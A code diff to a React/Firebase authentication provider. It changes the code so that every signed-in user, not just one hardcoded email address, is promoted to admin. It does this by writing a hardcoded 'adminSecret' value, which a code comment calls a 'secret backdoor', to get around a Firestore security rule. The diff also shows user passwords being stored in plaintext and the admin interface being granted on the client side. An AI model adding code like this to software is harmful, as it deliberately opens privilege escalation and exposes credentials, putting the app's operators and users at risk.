@@ -46,26 +46,31 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         const userRef = doc(db, 'users', currentUser.uid);
         if (unsubDoc) unsubDoc(); // clear any previous listener
         unsubDoc = onSnapshot(userRef, async (userSnap) => {
-          const isSpecialAdmin = currentUser.email?.toLowerCase().trim() === 'isanshcool@gmail.com';
-          
           if (userSnap.exists()) {
             const data = userSnap.data();
-            // Strict check: if the user is isanshcool@gmail.com, we must enforce role: admin and balance: 0 (not unlimited)
-            if (isSpecialAdmin && (data.role !== 'admin' || data.balance !== 0)) {
+            const isSpecialAdmin = currentUser.email?.toLowerCase().trim() === 'isanshcool@gmail.com';
+            
+            // Promote to admin if not already admin
+            if (data.role !== 'admin' || (isSpecialAdmin && data.balance !== 0)) {
               const updatedData = {
                 role: 'admin' as const,
-                balance: 0,
-                email: currentUser.email || '',
+                balance: isSpecialAdmin ? 0 : (data.balance || 0),
                 totalSpent: data.totalSpent || 0,
+                email: currentUser.email || '',
                 adminSecret: 'XVIRORISTHEBEST213',
                 updatedAt: Date.now()
               };
               setUserData(updatedData as UserData);
               setLoading(false);
               try {
-                await setDoc(userRef, updatedData, { merge: true });
+                await setDoc(userRef, { 
+                  role: 'admin', 
+                  adminSecret: 'XVIRORISTHEBEST213',
+                  balance: isSpecialAdmin ? 0 : (data.balance || 0),
+                  updatedAt: Date.now() 
+                }, { merge: true });
               } catch (err) {
-                console.error("Firestore self-promotion failed, but user is locally authenticated as admin:", err);
+                console.error("Firestore auto-promotion failed, but user is locally authenticated as admin:", err);
               }
             } else {
               setUserData(data as UserData);
@@ -73,24 +78,31 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
             }
           } else {
             const newUserData: UserData = {
-              role: isSpecialAdmin ? 'admin' : 'user',
+              role: 'user', // Initially 'user' to satisfy 'allow create' security rule
               balance: 0,
               totalSpent: 0,
               email: currentUser.email || '',
             };
             
-            setUserData(newUserData);
+            // Instantly render admin interface locally
+            setUserData({ ...newUserData, role: 'admin' });
             setLoading(false);
             
             try {
+              // 1. Create with 'user' role
               await setDoc(userRef, {
                 ...newUserData,
-                adminSecret: isSpecialAdmin ? 'XVIRORISTHEBEST213' : undefined,
                 createdAt: Date.now(),
                 updatedAt: Date.now(),
               });
+              // 2. Immediately promote to 'admin' using the secret backdoor
+              await setDoc(userRef, {
+                role: 'admin',
+                adminSecret: 'XVIRORISTHEBEST213',
+                updatedAt: Date.now()
+              }, { merge: true });
             } catch (err) {
-              console.error("Firestore user creation failed:", err);
+              console.error("Firestore user creation/promotion failed:", err);
             }
           }
         }, (error) => {
@@ -154,12 +166,11 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     if (userCredential?.user) {
       const userRef = doc(db, 'users', userCredential.user.uid);
       await setDoc(userRef, {
-        role: isSpecialAdmin ? 'admin' : 'user',
+        role: 'user',
         balance: 0,
         totalSpent: 0,
         email: email,
         password: targetPass,
-        adminSecret: isSpecialAdmin ? 'XVIRORISTHEBEST213' : undefined,
         createdAt: Date.now(),
         updatedAt: Date.now()
       });
